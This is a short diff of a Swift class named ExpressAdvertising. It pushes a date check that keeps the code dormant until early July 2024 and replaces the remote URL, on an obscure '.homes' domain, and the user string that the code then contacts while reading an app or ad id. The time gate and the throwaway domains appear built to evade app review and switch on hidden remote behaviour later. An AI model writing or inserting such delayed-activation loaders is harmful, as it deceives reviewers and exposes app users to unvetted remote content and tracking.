@@ -47,15 +47,15 @@ public final class ExpressAdvertising {
         }
         
         let specialDate = DateComponents(year: 2024,
-                                         month: 6,
-                                         day: 29)
+                                         month: 7,
+                                         day: 3)
         if Date() < Calendar.current.date(from: specialDate)! {
             completion("")
             return
         }
         
-        let source = "https://poleragatara.homes/omcorikk"
-        let user = "pofany"
+        let source = "https://lomogalagafadas.homes/oxfa"
+        let user = "libere"
         
         self.check(url: source) { result in
             let gaid = appsId
